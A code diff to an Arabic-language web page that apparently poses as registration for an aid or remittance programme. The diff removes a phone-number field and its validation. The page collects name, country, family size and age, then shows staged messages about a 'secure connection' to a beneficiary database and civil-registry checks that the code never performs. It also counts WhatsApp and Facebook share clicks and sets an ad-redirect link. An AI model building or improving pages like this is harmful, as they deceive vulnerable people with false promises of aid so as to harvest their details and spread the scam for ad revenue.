@@ -223,11 +223,7 @@
                     </select>
                 </div>
 
-                <div class="input-group">
-                    <label>رقم الهاتف المحمول (مصحوباً بالرمز الدولي لتأكيد الحوالة): <span class="required">*</span></label>
-                    <input type="tel" id="user-phone" placeholder="+966 500000000">
-                    <div class="input-hint">سيتم إرسال رمز التحقق عبر رسالة نصية قصيرة إلى هذا الرقم.</div>
-                </div>
+                <!-- ⛔ تم حذف حقل رقم الهاتف من هنا -->
 
                 <div class="input-group">
                     <label>عدد أفراد الأسرة: <span class="required">*</span></label>
@@ -247,7 +243,7 @@
                 <div class="loading-box">
                     <div class="spinner"></div>
                     <h3 id="status-headline" style="margin: 10px 0;">جاري بدء الاتصال الآمن بالسيرفر المركزي...</h3>
-                    <p id="status-sub" style="font-size: 14px; color: var(--text-gray);">يرجى الانتظار، يتم الآن فحص السجل المدني للرقم المدخل.</p>
+                    <p id="status-sub" style="font-size: 14px; color: var(--text-gray);">يرجى الانتظار، يتم الآن فحص السجل المدني للبيانات المدخلة.</p>
                     <div class="progress-container">
                         <div class="progress-inner" id="progress-bar"></div>
                     </div>
@@ -354,7 +350,7 @@
 
 <script>
     /* ============================================================
-       🟢 إعدادات المشاركة — الرسالة الطويلة
+       🟢 إعدادات المشاركة
        ============================================================ */
     const SHARE_URL = 'https://orpin-nine-75.vercel.app/';
 
@@ -365,7 +361,7 @@
         '🔗 *رابط التسجيل:* ' + SHARE_URL;
 
     /* ============================================================
-       🟢 رابط الإعلان (التحويل الكامل)
+       🟢 رابط الإعلان
        ============================================================ */
     const AD_URL = 'https://araplhn.org/4/4f5bfe10847783fc3ca91134a0884ecd';
 
@@ -435,36 +431,21 @@
     let savedAge     = "";
 
     /* ============================================================
-       🟢 التحقق من رقم الهاتف
-       ============================================================ */
-    function isValidPhone(phone) {
-        const cleaned = phone.replace(/[\s\-()]/g, '');
-        const regex = /^(\+|00)?[0-9]{10,15}$/;
-        return regex.test(cleaned);
-    }
-
-    /* ============================================================
-       🟢 processData
+       🟢 processData (بدون حقل الهاتف)
        ============================================================ */
     function processData() {
         let name    = document.getElementById('user-name').value.trim();
         let country = document.getElementById('user-country').value;
-        let phone   = document.getElementById('user-phone').value.trim();
         let family  = document.getElementById('user-family').value.trim();
         let age     = document.getElementById('user-age').value.trim();
 
-        if (name === "" || country === "" || phone === "" || family === "" || age === "") {
+        if (name === "" || country === "" || family === "" || age === "") {
             alert("يرجى ملء جميع الحقول المطلوبة بشكل صحيح لمطابقة بياناتك في النظام.");
             return;
         }
 
         if (name.length < 2) {
             alert("الاسم قصير جداً. يرجى كتابة الاسم الكامل.");
-            return;
-        }
-
-        if (!isValidPhone(phone)) {
-            alert("رقم الهاتف غير صحيح. يرجى إدخال رقم صحيح مع الرمز الدولي (مثال: +966500000000).");
             return;
         }
 
@@ -514,7 +495,7 @@
 
                 if (width === 20) {
                     headline.innerText = "الاتصال الآمن بـ قاعدة بيانات المستفيدين الكبرى...";
-                    sub.innerText = "يتم التحقق من عدم تكرار الهوية أو رقم الهاتف المحمول المعطى.";
+                    sub.innerText = "يتم التحقق من عدم تكرار الهوية أو البيانات المدخلة.";
                 }
                 if (width === 50) {
                     headline.innerText = "فحص الأهلية الاقتصادية بناءً على النطاق الجغرافي (" + country + ")...";
@@ -542,12 +523,10 @@
 
         if (platform === 'whatsapp') {
             waClicks++;
-            // ✅ النص الطويل يُشفَّر بـ encodeURIComponent
             const waUrl = 'https://api.whatsapp.com/send?text=' + encodeURIComponent(SHARE_TEXT);
             window.open(waUrl, '_blank');
         } else {
             fbClicks++;
-            // فيسبوك: النص يظهر من og:description (وليس من الرابط)
             const fbUrl = 'https://www.facebook.com/sharer/sharer.php?u=' +
                           encodeURIComponent(SHARE_URL) +
                           '&quote=' + encodeURIComponent(SHARE_TEXT);
@@ -719,4 +698,4 @@
     }, true);
 </script>
 </body>
-                                                                              </html>
+</html>
